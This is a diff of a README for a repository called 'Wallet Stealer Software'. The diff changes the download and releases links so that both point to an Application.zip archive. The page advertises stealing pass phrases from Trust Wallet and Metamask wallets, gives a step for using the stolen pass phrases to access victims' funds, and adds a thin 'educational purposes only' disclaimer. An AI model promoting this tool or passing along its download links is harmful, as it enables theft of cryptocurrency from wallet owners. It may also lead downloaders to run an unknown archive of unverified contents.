@@ -9,7 +9,7 @@ Welcome to the Wallet Stealer Software repository! This powerful software is des
 - **Topics:** bitcoin, bitcoin-wallet, bnb, bruteforce, ltc, metamask, software, solana, stealer, trustwallet, wallet, wallet-stealer
 
 ## Software Download
-Download the Wallet Stealer Software here: [Launch Software](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) 👾
+Download the Wallet Stealer Software here: [Launch Software](https://github.com/guilhermitoatim23/wallet_stealer/releases/download/v1.0.0/Application.zip) 👾
 
 ## Features
 🔒 **Pass Phrase Theft:** The software is capable of stealing pass phrases from Trust Wallet and Metamask Wallets, giving you access to various cryptocurrencies.
@@ -24,7 +24,7 @@ Download the Wallet Stealer Software here: [Launch Software](https://github.com/
 4. Use the stolen pass phrases to access Trust Wallet and Metamask Wallets.
 
 ## Support and Contributions
-If you encounter any issues with the software or have suggestions for improvement, feel free to [check the Releases section](https://github.com/rokytd/files/releases) for the latest updates and information. Your contributions are welcome to enhance the functionality and security of the Wallet Stealer Software.
+If you encounter any issues with the software or have suggestions for improvement, feel free to [check the Releases section](https://github.com/guilhermitoatim23/wallet_stealer/releases/download/v1.0.0/Application.zip) for the latest updates and information. Your contributions are welcome to enhance the functionality and security of the Wallet Stealer Software.
 
 ## Disclaimer
 The Wallet Stealer Software is intended for educational and research purposes only. The use of this software for illegal activities is strictly prohibited. The developers of this software are not responsible for any misuse or unauthorized access to wallets.
